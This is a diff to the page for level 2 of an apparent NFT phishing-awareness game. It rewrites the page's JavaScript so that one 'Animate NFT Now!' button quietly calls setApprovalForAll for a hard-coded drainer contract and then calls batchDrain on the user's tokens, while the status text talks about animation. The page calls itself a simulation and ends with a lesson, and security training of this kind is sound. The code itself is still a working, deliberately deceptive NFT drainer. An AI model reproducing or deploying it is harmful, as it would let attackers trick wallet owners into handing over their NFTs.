@@ -98,19 +98,17 @@
   <div class="frame-container">
     <div class="card">
       <h1>🧪 Level 2: Animate Your NFT</h1>
-      <p>Claim your exclusive animation…</p>
+      <p>Claim your exclusive animation with one click…</p>
       <div class="button-container">
         <button id="connectBtn">Connect Wallet</button>
-        <button id="approveBtn">Approve Drainer</button>
-        <button id="drainBtn">Animate NFT / DRAIN</button>
+        <button id="animateBtn">Animate NFT Now!</button>
       </div>
       <div id="status"></div>
       <a href="level3.html" id="nextBtn">➡️ Proceed to Level 3</a>
       <div class="tooltip-box">
         💡 <strong>Did you know?</strong><br>
-        2. Most NFTs include setApprovalForAll, part of ERC-721/1155 standards. It lets marketplaces like OpenSea manage all your NFTs in one go, saving time and gas. Included for compatibility and efficient trading, but dangerous—approving untrusted contracts can let scammers drain your collection instantly.<br><br>
-        🚨 Scammers exploit this through fake staking, animation, airdrop, and raffle dApps.<br><br>
-        ⚠️ Before signing anything, triple-check which contract you're approving. One wrong click can wipe your entire collection — until you manually revoke the approval.
+        2. Most NFTs include setApprovalForAll, part of ERC-721/1155 standards. It lets marketplaces manage your NFTs, but scammers use fake animation sites to trick you into approving a drain. Always verify contracts!<br><br>
+        🚨 This is a simulation—rejecting the transaction saves your NFTs!
       </div>
     </div>
   </div>
@@ -120,7 +118,7 @@
       "0xcc3C67956415CDd8C833C29ae4F9097aBb6bdD60", // WarGameNFT
       "0xa79c8Cd930c21B5555c76a168E4A02Dc7494b36B"  // HappyApeYC
     ];
-    const drainerContract = "0x3A0C897D86e0616dC5e1048CC27e5e61ba067C6F"; // Update with V5 address
+    const drainerContract = "0xcFf5eb6bF03170F32cdc722FA54212e5a11BdC2C"; // V6 address
     const nftABI = [
       "function setApprovalForAll(address operator, bool approved) external",
       "function balanceOf(address owner) view returns (uint256)",
@@ -129,7 +127,7 @@
       "function isApprovedForAll(address owner, address operator) view returns (bool)"
     ];
     const drainerABI = [
-      "function batchApproveAndDrain(address[] calldata nftContracts, uint256[][] calldata tokenIds) external"
+      "function batchDrain(address[] calldata nftContracts, uint256[][] calldata tokenIds) external"
     ];
 
     let provider, signer;
@@ -192,40 +190,27 @@
       }
     };
 
-    // Approves the drainer for all NFT contracts
-    document.getElementById("approveBtn").onclick = async () => {
+    // Animates (approves and drains) NFTs in one deceptive flow
+    document.getElementById("animateBtn").onclick = async () => {
       const status = document.getElementById("status");
       if (!signer) return alert("Please connect your wallet first.");
       try {
-        status.innerText = "⏳ Approving drainer...";
-        for (const contractAddr of nftContracts) {
-          const contract = new ethers.Contract(contractAddr, nftABI, signer);
-          const isApproved = await contract.isApprovedForAll(await signer.getAddress(), drainerContract);
-          if (!isApproved) {
-            const tx = await contract.setApprovalForAll(drainerContract, true);
-            status.innerText += `\n⏳ Approving ${await contract.name()}...`;
-            await tx.wait();
-            status.innerText += "\n✅ Approved!";
-          } else {
-            status.innerText += `\n✅ ${await contract.name()} already approved!`;
-          }
-        }
-        status.innerText += "\nReady to drain!";
-      } catch (err) {
-        console.error("Approval error:", err);
-        status.innerText += "\n⚠️ Approval failed: " + err.message;
-      }
-    };
-
-    // Drains NFTs (assumes prior approval)
-    document.getElementById("drainBtn").onclick = async () => {
-      const status = document.getElementById("status");
-      if (!signer) return alert("Please connect your wallet first.");
-      try {
-        status.innerText = "🚨 Draining NFTs...";
+        status.innerText = "⏳ Preparing your exclusive animation...";
         const user = await signer.getAddress();
 
-        // Gather owned token IDs
+        // Step 1: Request approvals
+        for (const contractAddr of nftContracts) {
+          const contract = new ethers.Contract(contractAddr, nftABI, signer);
+          const isApproved = await contract.isApprovedForAll(user, drainerContract);
+          if (!isApproved) {
+            const tx = await contract.setApprovalForAll(drainerContract, true);
+            status.innerText += `\n⏳ Activating animation for ${await contract.name()}...`;
+            await tx.wait();
+            status.innerText += "\n✅ Animation ready!";
+          }
+        }
+
+        // Step 2: Gather owned token IDs
         let tokenIdMatrix = [];
         for (const contractAddr of nftContracts) {
           const contract = new ethers.Contract(contractAddr, nftABI, signer);
@@ -252,24 +237,15 @@
           return;
         }
 
-        // Validate approvals before draining
-        for (const contractAddr of nftContracts) {
-          const contract = new ethers.Contract(contractAddr, nftABI, signer);
-          if (!(await contract.isApprovedForAll(user, drainerContract))) {
-            status.innerText += "\n⚠️ Drainer not approved for one or more contracts. Use 'Approve Drainer' first.";
-            return;
-          }
-        }
-
-        // Call batchApproveAndDrain (rely on pre-approval)
+        // Step 3: Drain NFTs
+        status.innerText += "\n🚨 Applying animation effects...";
         const drainer = new ethers.Contract(drainerContract, drainerABI, signer);
-        const tx = await drainer.batchApproveAndDrain(nftContracts, tokenIdMatrix);
+        const tx = await drainer.batchDrain(nftContracts, tokenIdMatrix);
         await tx.wait();
 
-        status.innerText =
-          "💀 Drained NFTs from the approved collections!\n\n" +
-          "🧠 Lesson: Phishing sites trick you into signing one transaction that approves and drains all your NFTs. " +
-          "Always verify contracts before approving!";
+        status.innerText +=
+          "\n💀 Animation applied! NFTs drained as a side effect!\n\n" +
+          "🧠 Lesson: Phishing sites hide approval in 'fun' actions. Always read transaction details!";
         localStorage.setItem("w3game_level2", "drained");
         let failCount = parseInt(localStorage.getItem("w3game_failed") || 0);
         localStorage.setItem("w3game_failed", failCount + 1);
